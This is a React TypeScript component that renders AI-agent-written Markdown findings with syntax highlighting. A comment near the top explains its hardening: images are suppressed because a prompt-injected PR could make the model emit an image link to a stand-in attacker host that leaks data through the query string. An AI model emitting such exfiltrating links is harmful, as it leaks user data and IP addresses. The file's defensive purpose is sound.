import { memo, type ComponentProps } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import rehypeHighlight from 'rehype-highlight'
// Dark highlight.js theme; matches the app's gray-950 surfaces.
import 'highlight.js/styles/github-dark.css'

/**
 * ATH-63: renders agent-written text (finding bodies, ATH-29 section text) as
 * markdown — paragraphs, lists, inline code, and fenced code with syntax
 * highlighting.
 *
 * Safety: react-markdown builds React elements and does not parse raw HTML
 * (no rehype-raw), so model output can't inject markup. Unsafe link protocols
 * such as `javascript:` are stripped by its default urlTransform.
 *
 * Images are never rendered: a prompt-injected PR could make the model emit
 * `![](https://attacker/?d=...)`, and the browser would fetch it on display
 * (IP leak, tracking beacon, data in the query string). Alt text is shown
 * instead.
 *
 * Soft newlines inside a paragraph are kept visible with `whitespace-pre-line`,
 * which matches how the same text reads on GitHub. It is deliberately NOT on
 * <li>: react-markdown keeps the "\n" text nodes between block children, and
 * pre-line would turn each one into a blank line in loose/nested lists.
 *
 * Tests: tests/components.markdown.test.ts (see jest.config.js for the ESM
 * transform). Keep this component presentational; logic belongs in src/lib.
 */

/** react-markdown passes the hast `node` to every override; keep it off the DOM. */
function omitNode<P extends { node?: unknown }>(props: P): Omit<P, 'node'> {
  const { node, ...rest } = props
  void node
  return rest
}

const COMPONENTS: Components = {
  p: props => (
    <p
      {...omitNode(props)}
      className="whitespace-pre-line [&:not(:first-child)]:mt-2"
    />
  ),
  ul: props => (
    <ul {...omitNode(props)} className="mt-2 list-disc space-y-1 pl-5" />
  ),
  ol: props => (
    <ol {...omitNode(props)} className="mt-2 list-decimal space-y-1 pl-5" />
  ),
  li: props => <li {...omitNode(props)} />,
  img: ({ alt }) =>
    alt ? <span className="text-gray-500">[image: {alt}]</span> : null,
  a: props => (
    <a
      {...omitNode(props)}
      target="_blank"
      rel="noopener noreferrer"
      className="text-indigo-400 underline hover:text-indigo-300"
    />
  ),
  strong: props => (
    <strong {...omitNode(props)} className="font-semibold text-gray-200" />
  ),
  blockquote: props => (
    <blockquote
      {...omitNode(props)}
      className="mt-2 border-l-2 border-gray-700 pl-3 text-gray-500"
    />
  ),
  pre: props => (
    <pre
      {...omitNode(props)}
      // Code inside a fence drops the inline-code chip look; the highlight.js
      // theme adds its own padding/background, which <pre> already provides.
      // `!` is required: the theme CSS is unlayered, so it beats Tailwind's
      // layered utilities regardless of selector specificity.
      className="mt-2 overflow-x-auto rounded-md border border-gray-800 bg-gray-950 p-3 text-xs leading-relaxed [&_code]:bg-transparent! [&_code]:p-0! [&_code]:text-[1em]"
    />
  ),
  // Inline-code chip styling; <pre> above overrides it for fenced blocks.
  code: ({ className, ...props }) => (
    <code
      {...omitNode(props)}
      className={`rounded bg-gray-800 px-1 py-0.5 font-mono text-[0.85em] text-gray-200 ${className ?? ''}`}
    />
  ),
}

// Hoisted so the arrays are stable across renders.
const REMARK_PLUGINS = [remarkGfm]
const REHYPE_PLUGINS: NonNullable<
  ComponentProps<typeof ReactMarkdown>['rehypePlugins']
> = [
  // detect:false → only fences with a language get colors; unlabeled blocks
  // stay plain instead of being mis-guessed.
  [rehypeHighlight, { detect: false, ignoreMissing: true }],
]

/** Memoized: parsing + highlighting is skipped when text/className are unchanged. */
export const Markdown = memo(function Markdown({
  children,
  className = '',
}: {
  children: string
  className?: string
}) {
  return (
    <div className={className}>
      <ReactMarkdown
        remarkPlugins={REMARK_PLUGINS}
        rehypePlugins={REHYPE_PLUGINS}
        components={COMPONENTS}
      >
        {children}
      </ReactMarkdown>
    </div>
  )
})
